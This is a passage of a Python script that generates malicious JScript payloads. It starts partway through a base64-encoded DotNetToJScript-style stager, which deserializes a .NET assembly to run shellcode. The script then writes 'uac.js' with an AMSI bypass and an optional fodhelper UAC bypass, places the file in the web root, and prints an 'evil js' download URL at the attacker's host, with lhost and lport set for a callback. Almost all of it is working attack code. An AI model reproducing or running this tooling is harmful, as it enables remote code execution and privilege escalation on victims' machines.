CdUFHRUFiQUJHQUdrQWJBQmxBRzRBWVFCdEFHVUFBQUJGQUhnQVlRQnRBSEFBYkFCbEFFRUFjd0J6IisKIkFHVUFiUUJpQUd3QWVRQXVBR1FBYkFCc0FBQUFRQUFRQUFFQVVBQnlBRzhBWkFCMUFHTUFkQUJPQUdFQWJRQmxBQUFBQUFCRkFIZ0EiKwoiWVFCdEFIQUFiQUJsQUVFQWN3QnpBR1VBYlFCaUFHd0FlUUFBQURRQUNBQUJBRkFBY2dCdkFHUUFkUUJqQUhRQVZnQmxBSElBY3dCcCIrCiJBRzhBYmdBQUFERUFMZ0F3QUM0QU1BQXVBREFBQUFBNEFBZ0FBUUJCQUhNQWN3QmxBRzBBWWdCc0FIa0FJQUJXQUdVQWNnQnpBR2tBIisKImJ3QnVBQUFBTVFBdUFEQUFMZ0F3QUM0QU1BQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIrCiJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBIisKIkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIrCiJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBIisKIkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIrCiJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBIisKIkFBQUFBQUFBQUFBQUFBQUFBQUVOQUFBQUJBQUFBQWtYQUFBQUNRWUFBQUFKRmdBQUFBWWFBQUFBSjFONWMzUmxiUzVTWldac1pXTjAiKwoiYVc5dUxrRnpjMlZ0WW14NUlFeHZZV1FvUW5sMFpWdGRLUWdBQUFBS0N3QUEiOwp2YXIgZW50cnlfY2xhc3MgPSAnVGVzdENsYXNzJzsKCnRyeSB7CiAgICBzZXR2ZXJzaW9uKCk7CiAgICB2YXIgc3RtID0gYmFzZTY0VG9TdHJlYW0oc2VyaWFsaXplZF9vYmopOwogICAgdmFyIGZtdCA9IG5ldyBBY3RpdmVYT2JqZWN0KCdTeXN0ZW0uUnVudGltZS5TZXJpYWxpemF0aW9uLkZvcm1hdHRlcnMuQmluYXJ5LkJpbmFyeUZvcm1hdHRlcicpOwogICAgdmFyIGFsID0gbmV3IEFjdGl2ZVhPYmplY3QoJ1N5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QnKTsKICAgIHZhciBuID0gZm10LlN1cnJvZ2F0ZVNlbGVjdG9yOwogICAgdmFyIGQgPSBmbXQuRGVzZXJpYWxpemVfMihzdG0pOwogICAgYWwuQWRkKG4pOwogICAgdmFyIG8gPSBkLkR5bmFtaWNJbnZva2UoYWwuVG9BcnJheSgpKS5DcmVhdGVJbnN0YW5jZShlbnRyeV9jbGFzcyk7"
        lower = "by5nb2dvKHNjKTsKfSBjYXRjaCAoZSkgewogICAgZGVidWcoZS5tZXNzYWdlKTsKfQ=="

        runfilename = "uac.js"

        fodfilename,cmdstring_b64 = writefodhelper(lhost,"exe")
        data = "\n\tvar sc = \"%s\"" % cmdstring_b64

    with open(runfilename,'w') as f:
        amsi = base64.b64decode(amsi).decode() 
        upper = base64.b64decode(upper).decode()
        lower = base64.b64decode(lower).decode()
        f.write(amsi + "\n\n") #will fail the first time, disable if not necessary (but now works!)
        f.write(upper)
        f.write(data + ";\n")
        f.write("\t"+lower)
    
    f.close()
    print ('[+] %s written' % runfilename)
    return runfilename
    pass

def makejs(bitness,pformat,uacbypass,lhost):
    if uacbypass == "0":
        gen(lhost,lport,bitness,pformat)
    if uacbypass == "1":
        runner(lhost,lport,bitness)
    runfilename = writejs(bitness,pformat,uacbypass,lhost)
    payfilepath = "/var/www/html/"
    copy(runfilename,payfilepath,runfilename)
    print ('[+] evil js: http://'+lhost+'/'+runfilename+'')
    return runfilename

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    
    parser.add_argument('--arch','-a',required=True,dest='arch',help='32 or 64')
    parser.add_argument('--lhost','-l',required=True,dest='host',help='lhost')
    parser.add_argument('--lport','-p',required=True,dest='port',help='lport')
    parser.add_argument('--uac','-u',required=False,dest='uacbypass',help='uacbypass 0 or 1')
    args = parser.parse_args()
    
    bitness = args.arch
    lhost = args.host
    lport = args.port

    uacbypass = args.uacbypass
    if uacbypass != "1":
        uacbypass = "0"

    pformat = "raw"

    makejs(bitness,pformat,uacbypass,lhost)